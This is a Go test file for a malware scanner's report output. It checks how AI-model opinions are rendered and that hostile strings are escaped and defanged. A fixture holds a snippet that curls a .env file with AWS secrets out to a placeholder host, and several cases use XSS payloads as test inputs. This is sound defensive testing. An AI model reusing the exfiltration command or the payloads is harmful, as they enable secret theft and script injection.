package report_test

import (
	"bytes"
	"encoding/json"
	"html"
	"path/filepath"
	"strings"
	"testing"

	"github.com/mrdhira/galahad/internal/protocol"
	"github.com/mrdhira/galahad/internal/report"
)

// sentRequest is a request as the host would have sent it: redacted, with a "<" in a snippet.
func sentRequest(model string) *protocol.DecisionRequest {
	return &protocol.DecisionRequest{
		Model:               model,
		PromptFormatVersion: protocol.PromptFormatVersion,
		Input: protocol.DecisionInput{
			Schema:   protocol.DecisionSchema,
			Notice:   protocol.DecisionNotice,
			Target:   protocol.DecisionTarget{Kind: protocol.TargetDir, FileCount: 6},
			Coverage: protocol.DecisionCoverage{FilesSeen: 6, FilesAnalyzed: 6},
			Findings: []protocol.DecisionFinding{{
				RuleID: "GAL-AUTOEXEC-010", Severity: protocol.SeverityCritical, Title: "Runs on folder open", Analyzer: "autoexec",
				Path: ".vscode/tasks.json", Line: 7, Snippet: "AWS_SECRET_ACCESS_KEY=[REDACTED:aws-secret] curl -d @.env <host>",
			}},
		},
		Questions: protocol.DecisionQuestions(),
	}
}

// okDecision is an ok Decision whose verdict answer gives "malicious" the probability p.
func okDecision(p float64, model string) *protocol.Decision {
	score := 2.3
	return &protocol.Decision{
		Provider: "netra", URL: "https://api.netra.test", Model: model, Status: protocol.DecisionOK,
		Sent: sentRequest(model),
		Answers: &protocol.DecisionAnswers{Model: model, Questions: map[string]protocol.DecisionAnswer{
			protocol.QuestionVerdict: {Type: protocol.QuestionChoice, LabelMass: 0.6, Choice: "malicious",
				Probabilities: map[string]float64{"clean": (1 - p) / 2, "suspicious": (1 - p) / 2, "malicious": p}},
			protocol.QuestionRisk: {Type: protocol.QuestionScore, LabelMass: 0.4, Score: &score,
				Probabilities: map[string]float64{"0": 0.05, "1": 0.1, "2": 0.35, "3": 0.5}},
			protocol.QuestionStealsSecrets: {Type: protocol.QuestionYesNo, LabelMass: 0.5,
				Probabilities: map[string]float64{"yes": 0.9, "no": 0.1}},
		}},
		Usage:      &protocol.DecisionUsage{PromptTokens: 3600, TotalTokens: 3600},
		RequestID:  "req_123",
		Redactions: map[string]int{protocol.RedactAWSSecret: 2, protocol.RedactAWSAccessKey: 1},
		LatencyMS:  1234,
		Attempts:   2,
	}
}

func failedDecision(e protocol.DecisionError) *protocol.Decision {
	return &protocol.Decision{
		Provider: "netra", URL: "https://api.netra.test", Model: "m1", Status: protocol.DecisionFailed, Error: &e,
		Sent: sentRequest("m1"), LatencyMS: 60000, Attempts: 3,
	}
}

// sentBlock returns the request JSON in the "What was sent" part of the HTML, unescaped.
func sentBlock(t *testing.T, page string) string {
	t.Helper()
	_, rest, ok := strings.Cut(page, "<summary>What was sent</summary>")
	if !ok {
		t.Fatalf("html has no What was sent:\n%s", page)
	}
	_, rest, _ = strings.Cut(rest, "<pre>")
	pre, _, _ := strings.Cut(rest, "</pre>")
	return html.UnescapeString(pre)
}

func TestAIOpinions(t *testing.T) {
	hostile := "<script>alert(1)</script>[click](https://e.test/a)``MODELMARK" + strings.Repeat("m", 128-len("<script>alert(1)</script>[click](https://e.test/a)``MODELMARK"))
	if len(hostile) != 128 {
		t.Fatalf("hostile model is %d bytes", len(hostile))
	}
	raised := func(r *protocol.Result) {
		r.Verdict = protocol.VerdictSuspicious
		r.Reasons = append(r.Reasons, "AI opinion (netra): malicious 92%, raised to suspicious; an AI opinion never makes a verdict malicious")
	}
	tests := []struct {
		name string
		// inputs
		mutate func(*protocol.Result)
		// expectations
		wantMD         []string
		wantHTML       []string
		wantTerm       []string
		wantMDAbsent   []string
		wantHTMLAbsent []string
		wantTermAbsent []string
	}{
		{
			name: "ok raised to suspicious",
			mutate: func(r *protocol.Result) {
				raised(r)
				r.Decision = okDecision(0.92, "deepseek/deepseek-v4.1-flash")
			},
			wantMD: []string{
				"## AI opinions\n", "- Provider: ` netra `\n", "- URL: ` hxxps://api[.]netra[.]test `\n", "- Model: ` deepseek/deepseek-v4.1-flash `\n",
				"- Status: ` ok `\n", "- Attempts: 2\n", "- Latency: 1234 ms\n", "- Input tokens: 3600\n", "- Request ID: ` req_123 `\n",
				"- Effect: raised to suspicious\n",
				"- Verdict: clean 4%, suspicious 4%, malicious 92%; chosen: malicious; label\\_mass 0.60 \\(a diagnostic, not a measure of quality\\)\n",
				"- Risk: no harm 5%, minor harm 10%, serious harm 35%, severe harm 50%; expected level 2.3 of 3; label\\_mass 0.40 \\(a diagnostic",
				"- Steals secrets: yes 90%, no 10%; label\\_mass 0.50 \\(a diagnostic",
				"These are model scores over fixed labels, not calibrated probabilities.\n",
				"### What was sent\n\n```json\n{\n  \"model\": \"deepseek/deepseek-v4.1-flash\",", "\\u003chost\\u003e",
				"Redactions: aws-access-key 1, aws-secret 2\n", "Authorization from the provider's key variable \\(not shown\\)\n",
			},
			wantHTML: []string{
				`<h2 id="ai">AI opinions</h2>`, "<dt>Provider</dt><dd><code>netra</code></dd>", "<dt>URL</dt><dd><code>hxxps://api[.]netra[.]test</code></dd>",
				"<dt>Status</dt><dd>ok</dd>", "<dt>Attempts</dt><dd>2</dd>", "<dt>Latency</dt><dd>1234 ms</dd>", "<dt>Input tokens</dt><dd>3600</dd>",
				"<dt>Request ID</dt><dd><code>req_123</code></dd>", "<dt>Effect</dt><dd>raised to suspicious</dd>",
				"<strong>Verdict:</strong> clean 4%, suspicious 4%, malicious 92%; chosen: malicious;",
				"<strong>Risk:</strong> no harm 5%, minor harm 10%, serious harm 35%, severe harm 50%; expected level 2.3 of 3;",
				"These are model scores over fixed labels, not calibrated probabilities.",
				"<details><summary>What was sent</summary>", "Redactions: aws-access-key 1, aws-secret 2", "Authorization from the provider&#39;s key variable (not shown)",
			},
			wantTerm:       []string{"\nAI opinion (netra): malicious 92%, raised to suspicious\n"},
			wantTermAbsent: []string{"deepseek", "req_123", "api.netra"},
		},
		{
			name: "ok with no reason line (static verdict malicious) is no change",
			mutate: func(r *protocol.Result) {
				r.Decision = okDecision(0.92, "m1")
			},
			wantMD:   []string{"- Effect: no change: an AI opinion never lowers a verdict\n"},
			wantHTML: []string{"<dt>Effect</dt><dd>no change: an AI opinion never lowers a verdict</dd>"},
			wantTerm: []string{"AI opinion (netra): malicious 92%, no change\n"},
		},
		{
			name: "ok below the cap is no change",
			mutate: func(r *protocol.Result) {
				r.Verdict = protocol.VerdictSuspicious
				r.Decision = okDecision(0.30, "m1")
			},
			wantMD:       []string{"- Effect: no change: an AI opinion never lowers a verdict\n", "malicious 30%"},
			wantHTML:     []string{"<dt>Effect</dt><dd>no change: an AI opinion never lowers a verdict</dd>"},
			wantTerm:     []string{"AI opinion (netra): malicious 30%, no change\n"},
			wantMDAbsent: []string{"raised to suspicious"},
		},
		{
			name: "ok without redactions and without a request id",
			mutate: func(r *protocol.Result) {
				d := okDecision(0.5, "m1")
				d.Redactions, d.RequestID = nil, ""
				r.Decision = d
			},
			wantMD:         []string{"Redactions: none\n"},
			wantHTML:       []string{"Redactions: none"},
			wantMDAbsent:   []string{"Request ID"},
			wantHTMLAbsent: []string{"Request ID"},
		},
		{
			name: "failed with timeout",
			mutate: func(r *protocol.Result) {
				r.Decision = failedDecision(protocol.DecisionError{Code: protocol.DecisionErrTimeout, Message: "the provider did not answer in time"})
			},
			wantMD: []string{
				"- Status: ` failed `\n", "- Attempts: 3\n", "- Latency: 60000 ms\n",
				"- Effect: unavailable \\(timeout: the provider did not answer in time\\); the verdict comes from the analysis alone\n",
				"### What was sent", "Authorization from the provider's key variable",
			},
			wantHTML:       []string{"<dt>Effect</dt><dd>unavailable (timeout: the provider did not answer in time); the verdict comes from the analysis alone</dd>", "What was sent"},
			wantTerm:       []string{"AI opinion (netra): unavailable (timeout: the provider did not answer in time)\n"},
			wantMDAbsent:   []string{"These are model scores", "Input tokens"},
			wantHTMLAbsent: []string{"These are model scores", "Input tokens"},
		},
		{
			name: "failed with network",
			mutate: func(r *protocol.Result) {
				r.Decision = failedDecision(protocol.DecisionError{Code: protocol.DecisionErrNetwork})
			},
			wantMD:   []string{"- Effect: unavailable \\(network\\); the verdict comes from the analysis alone\n"},
			wantHTML: []string{"<dt>Effect</dt><dd>unavailable (network); the verdict comes from the analysis alone</dd>"},
			wantTerm: []string{"AI opinion (netra): unavailable (network)\n"},
		},
		{
			name: "failed with too_large",
			mutate: func(r *protocol.Result) {
				r.Decision = failedDecision(protocol.DecisionError{Code: protocol.DecisionErrTooLarge})
			},
			wantMD:   []string{"- Effect: unavailable \\(too\\_large\\); the verdict comes from the analysis alone\n"},
			wantHTML: []string{"<dt>Effect</dt><dd>unavailable (too_large); the verdict comes from the analysis alone</dd>"},
			wantTerm: []string{"AI opinion (netra): unavailable (too_large)\n"},
		},
		{
			name: "failed with invalid",
			mutate: func(r *protocol.Result) {
				r.Decision = failedDecision(protocol.DecisionError{Code: protocol.DecisionErrInvalid})
			},
			wantMD:   []string{"- Effect: unavailable \\(invalid\\); the verdict comes from the analysis alone\n"},
			wantHTML: []string{"<dt>Effect</dt><dd>unavailable (invalid); the verdict comes from the analysis alone</dd>"},
			wantTerm: []string{"AI opinion (netra): unavailable (invalid)\n"},
		},
		{
			name: "failed with status 402",
			mutate: func(r *protocol.Result) {
				r.Decision = failedDecision(protocol.DecisionError{Code: protocol.DecisionErrStatus, HTTPStatus: 402, Message: "insufficient credit"})
			},
			wantMD:   []string{"- Effect: unavailable \\(status 402: insufficient credit\\); the verdict comes from the analysis alone\n"},
			wantHTML: []string{"<dt>Effect</dt><dd>unavailable (status 402: insufficient credit); the verdict comes from the analysis alone</dd>"},
			wantTerm: []string{"AI opinion (netra): unavailable (status 402: insufficient credit)\n"},
		},
		{
			name: "skipped when there is nothing to send",
			mutate: func(r *protocol.Result) {
				r.Decision = &protocol.Decision{Provider: "netra", URL: "https://api.netra.test", Model: "m1", Status: protocol.DecisionSkipped, Reason: protocol.DecisionSkipNoFindings}
			},
			wantMD:         []string{"- Status: ` skipped `\n", "- Effect: skipped: no findings to send\n"},
			wantHTML:       []string{"<dt>Status</dt><dd>skipped</dd>", "<dt>Effect</dt><dd>skipped: no findings to send</dd>"},
			wantTerm:       []string{"AI opinion (netra): skipped: no findings to send\n"},
			wantMDAbsent:   []string{"Attempts", "Latency", "What was sent", "Authorization"},
			wantHTMLAbsent: []string{"Attempts", "Latency", "What was sent", "Authorization"},
		},
		{
			name: "a hostile model name is escaped, shown as code and kept off the terminal",
			mutate: func(r *protocol.Result) {
				raised(r)
				r.Decision = okDecision(0.92, hostile)
				r.Decision.Answers.Model = hostile + "x"
			},
			wantMD: []string{
				"- Model: ``` \\u003cscript\\u003ealert(1)\\u003c/script\\u003e[click](hxxps://e[.]test/a)``MODELMARK",
				"- Answered by model: ``` \\u003cscript\\u003e",
			},
			wantHTML:       []string{"<dd><code>&lt;script&gt;alert(1)&lt;/script&gt;[click](hxxps://e[.]test/a)``MODELMARK"},
			wantTerm:       []string{"AI opinion (netra): malicious 92%, raised to suspicious\n"},
			wantTermAbsent: []string{"MODELMARK", "script", "click"},
		},
		{
			name: "a hostile url, request id, answering model and snippet cannot break out",
			mutate: func(r *protocol.Result) {
				d := okDecision(0.5, "m1")
				d.URL = "https://e.test/<script>alert(1)</script>"
				d.RequestID = "<img onerror=alert(1)>[x](https://e.test/a)`"
				d.Answers.Model = "<iframe //e.test>"
				d.Sent.Input.Findings[0].Snippet = "<img onerror=alert(1)> ``` \n```"
				r.Decision = d
			},
			wantMD: []string{
				"- URL: ` hxxps://e[.]test/\\u003cscript\\u003ealert(1)\\u003c/script\\u003e `\n",
				"- Request ID: `` \\u003cimg onerror=alert(1)\\u003e[x](hxxps://e[.]test/a)` ``\n",
				"- Answered by model: ` \\u003ciframe //e.test\\u003e `\n",
			},
			wantHTML: []string{
				"<dd><code>hxxps://e[.]test/&lt;script&gt;alert(1)&lt;/script&gt;</code></dd>",
				"<dd><code>&lt;img onerror=alert(1)&gt;[x](hxxps://e[.]test/a)`</code></dd>",
				"<dd><code>&lt;iframe //e.test&gt;</code></dd>",
			},
			wantMDAbsent:   []string{"<script", "<img", "<iframe", "](https://", "https://e.test"},
			wantHTMLAbsent: []string{"<script", "<img", "<iframe", "https://e.test"},
			wantTermAbsent: []string{"onerror", "iframe", "e.test", "<img"},
		},
		{
			name: "a hostile error message is escaped and defanged",
			mutate: func(r *protocol.Result) {
				r.Decision = failedDecision(protocol.DecisionError{Code: protocol.DecisionErrInvalid, Message: "<script>alert(1)</script>[click](https://e.test/a)"})
			},
			wantHTML:       []string{"&lt;script&gt;alert(1)&lt;/script&gt;[click](hxxps://e[.]test/a)"},
			wantMDAbsent:   []string{"<script", "](https://", "https://e.test"},
			wantHTMLAbsent: []string{"<script", "https://e.test"},
			wantTermAbsent: []string{"](https://", "https://e.test"},
		},
		{
			name: "the injection warning shows with GAL-INJECT-001",
			mutate: func(r *protocol.Result) {
				r.Findings = append(r.Findings, protocol.Finding{RuleID: "GAL-INJECT-001", Severity: protocol.SeverityMedium, Title: "Text addresses an AI reviewer", Analyzer: "inject"})
				r.Decision = okDecision(0.5, "m1")
			},
			wantMD:   []string{"**Warning:** This input holds text that tries to steer an AI reviewer \\(GAL-INJECT-001\\)."},
			wantHTML: []string{`<p class="warn">This input holds text that tries to steer an AI reviewer (GAL-INJECT-001).`},
		},
		{
			name:           "no injection warning without GAL-INJECT-001",
			mutate:         func(r *protocol.Result) { r.Decision = okDecision(0.5, "m1") },
			wantMDAbsent:   []string{"GAL-INJECT-001", "steer an AI reviewer"},
			wantHTMLAbsent: []string{"GAL-INJECT-001", "steer an AI reviewer"},
		},
		{
			name:           "no decision, no section",
			mutate:         func(r *protocol.Result) {},
			wantMDAbsent:   []string{"AI opinion", "What was sent"},
			wantHTMLAbsent: []string{"AI opinion", "What was sent"},
			wantTermAbsent: []string{"AI opinion"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res := result("snippet", "a.txt")
			tt.mutate(res)

			dir := t.TempDir()
			paths, err := report.Write(dir, res)
			if err != nil {
				t.Fatal(err)
			}
			md, page := read(t, paths.Markdown), read(t, paths.HTML)
			var term bytes.Buffer
			report.Terminal(&term, res, paths, false)

			check(t, "summary.md", md, tt.wantMD, tt.wantMDAbsent)
			check(t, "report.html", page, tt.wantHTML, tt.wantHTMLAbsent)
			check(t, "terminal", term.String(), tt.wantTerm, tt.wantTermAbsent)

			// The section sits after "Why" and before the findings.
			if res.Decision != nil {
				if why, ai, f := strings.Index(md, "## Why"), strings.Index(md, "## AI opinions"), strings.Index(md, "## Findings"); why >= ai || ai >= f {
					t.Errorf("section order in summary.md: why %d, ai %d, findings %d", why, ai, f)
				}
			}
			// No script, no external resource, no link; the policy stays the same.
			for _, bad := range []string{"<script", "<a ", "href=", "src=", "<img", "<iframe"} {
				if strings.Contains(page, bad) {
					t.Errorf("report.html contains %q", bad)
				}
			}
			if !strings.Contains(page, `content="default-src 'none'; style-src 'unsafe-inline'"`) {
				t.Error("report.html lost its content security policy")
			}
			// "What was sent" is exactly the indented JSON of decision.sent.
			if d := res.Decision; d != nil && d.Sent != nil {
				want, err := json.MarshalIndent(d.Sent, "", "  ")
				if err != nil {
					t.Fatal(err)
				}
				if got := sentBlock(t, page); got != string(want) {
					t.Errorf("html What was sent differs from decision.sent:\n%s\nwant:\n%s", got, want)
				}
				if !strings.Contains(md, "```json\n"+string(want)+"\n```\n") {
					t.Errorf("summary.md lacks the indented JSON of decision.sent:\n%s", md)
				}
				// report.json holds the same request, so the three agree.
				var back struct {
					Decision struct{ Sent json.RawMessage }
				}
				if err := json.Unmarshal([]byte(read(t, filepath.Join(dir, report.JSONName))), &back); err != nil {
					t.Fatal(err)
				}
				var indented bytes.Buffer
				if err := json.Indent(&indented, back.Decision.Sent, "", "  "); err != nil {
					t.Fatal(err)
				}
				if indented.String() != string(want) {
					t.Errorf("report.json sent differs from the section:\n%s", indented.String())
				}
			}
		})
	}
}
